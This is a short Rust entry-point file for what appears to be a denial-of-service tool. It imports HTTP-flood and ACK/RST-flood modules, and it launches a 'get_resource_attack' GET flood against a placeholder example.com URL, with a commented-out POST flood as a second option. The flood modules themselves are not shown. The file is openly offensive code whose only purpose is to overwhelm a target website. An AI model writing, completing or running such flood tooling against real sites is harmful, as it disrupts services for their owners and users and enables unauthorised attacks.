use std::error::Error;

mod http_flood;
mod ack_rst_flood;
mod utils;

#[tokio::main]
async fn main() ->  Result<(),  Box<dyn Error>>{
    utils::show_logo();
    
    let site= ".example.com";
    let url: String= format!("https://www.{site}");
    let times= 2;
    let http_flood= http_flood::HttpFlood::new(url, times);

    // Option 1
    http_flood.get_resource_attack().await;
    
    // Option 2
    // let _= http_flood.post_requeste_attack("body".to_string(), utils::get_text_data()).await;

    Ok(())
}